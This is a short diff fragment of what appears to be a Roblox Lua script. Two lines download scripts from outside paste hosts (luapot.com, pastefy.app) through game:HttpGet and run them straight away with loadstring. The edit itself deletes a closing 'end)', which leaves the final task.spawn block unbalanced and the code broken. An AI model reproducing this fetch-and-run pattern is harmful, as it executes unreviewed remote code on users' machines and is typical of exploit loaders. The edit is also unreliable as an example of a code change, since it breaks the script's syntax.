@@ -79,4 +79,3 @@ loadstring(game:HttpGet("https://luapot.com/api/loadstring/26c4a4331358247078ffc
 end)
 task.spawn(function()
 loadstring(game:HttpGet("https://pastefy.app/nfCFsita/raw"))()
-end)
